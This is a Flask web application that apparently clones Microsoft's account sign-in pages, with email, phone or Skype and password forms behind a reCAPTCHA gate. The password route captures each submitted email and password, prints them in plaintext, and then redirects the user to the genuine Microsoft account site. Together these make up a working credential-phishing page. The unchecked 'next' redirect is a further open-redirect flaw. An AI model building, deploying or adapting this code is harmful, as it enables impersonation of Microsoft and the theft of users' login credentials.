from flask import Flask, render_template, request, redirect, url_for, flash, session
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField, HiddenField
from wtforms.validators import DataRequired, Email
from flask_wtf.csrf import CSRFProtect
from dotenv import load_dotenv
import requests
import os

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-here')

# reCAPTCHA configuration
app.config['RECAPTCHA_SITE_KEY'] = os.environ.get('RECAPTCHA_SITE_KEY', 'your-site-key-here')
app.config['RECAPTCHA_SECRET_KEY'] = os.environ.get('RECAPTCHA_SECRET_KEY', 'your-secret-key-here')

csrf = CSRFProtect(app)

def verify_recaptcha(recaptcha_response):
    """Verify reCAPTCHA response with Google's API"""
    secret_key = app.config['RECAPTCHA_SECRET_KEY']
    
    data = {
        'secret': secret_key,
        'response': recaptcha_response
    }
    
    try:
        response = requests.post('https://www.google.com/recaptcha/api/siteverify', data=data)
        result = response.json()
        return result.get('success', False)
    except:
        return False

class CaptchaForm(FlaskForm):
    recaptcha_response = HiddenField('reCAPTCHA Response')
    submit = SubmitField('Verify')

class EmailForm(FlaskForm):
    email = StringField('Email, phone, or Skype', validators=[DataRequired()])
    submit = SubmitField('Next')

class PasswordForm(FlaskForm):
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Sign in')

@app.route('/captcha', methods=['GET', 'POST'])
def captcha_page():
    form = CaptchaForm()
    if request.method == 'POST':
        recaptcha_response = request.form.get('g-recaptcha-response')
        
        if recaptcha_response and verify_recaptcha(recaptcha_response):
            # Set session flag to indicate reCAPTCHA verification
            session['captcha_verified'] = True
            # Redirect to the original page they were trying to access
            next_page = request.form.get('next') or url_for('email_page1')
            return redirect(next_page)
        else:
            flash('Please complete the reCAPTCHA verification.', 'error')
    
    # Pass the next parameter to the template
    next_page = request.args.get('next', url_for('email_page1'))
    return render_template('captcha.html', form=form, site_key=app.config['RECAPTCHA_SITE_KEY'], next=next_page)

def captcha_required(f):
    """Decorator to require reCAPTCHA verification before accessing a route"""
    from functools import wraps
    
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('captcha_verified'):
            return redirect(url_for('captcha_page', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/', methods=['GET', 'POST'])
@captcha_required
def email_page1():
    form = EmailForm()
    if form.validate_on_submit():
        session['email'] = form.email.data
        return redirect(url_for('password_page'))
    return render_template('home.html', form=form)

@app.route('/email', methods=['GET', 'POST'])
@captcha_required
def email_page2():
    form = EmailForm()
    if form.validate_on_submit():
        session['email'] = form.email.data
        return redirect(url_for('password_page'))
    return render_template('email.html', form=form)




@app.route('/password', methods=['GET', 'POST'])
@captcha_required
def password_page():
    if 'email' not in session:
        return redirect(url_for('email_page2'))
    
    form = PasswordForm()
    if form.validate_on_submit():
        # Here you would typically validate the credentials
        email = session.get('email')
        password = form.password.data
        print(f"Login attempt - Email: {email}, Password: {password}")
        
        # Clear the session before redirecting
        session.clear()
        
        # Redirect to Microsoft account page
        return redirect('https://account.microsoft.com/account/')
    
    return render_template('password.html', form=form, email=session['email'])

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('captcha_page'))

@app.route('/create-account')
def create_account():
    return "Create Account Page (Not Implemented)"

@app.route('/forgot-password')
def forgot_password():
    return "Forgot Password Page (Not Implemented)"

@app.route('/cant-access')
def cant_access():
    return "Can't Access Account Page (Not Implemented)"

if __name__ == '__main__':
    app.run(debug=True)
